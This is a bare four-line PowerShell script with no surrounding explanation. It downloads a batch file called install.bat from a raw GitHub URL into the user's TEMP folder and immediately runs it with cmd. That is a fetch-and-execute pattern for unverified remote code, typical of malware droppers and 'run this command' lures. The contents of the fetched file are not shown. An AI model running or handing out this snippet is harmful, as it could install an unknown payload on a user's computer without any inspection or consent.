$bat = 'https://raw.githubusercontent.com/hyaynygy123/hang/refs/heads/main/install.bat'
$f = "$env:TEMP\remote.bat"
Invoke-WebRequest $bat -OutFile $f
cmd /c $f
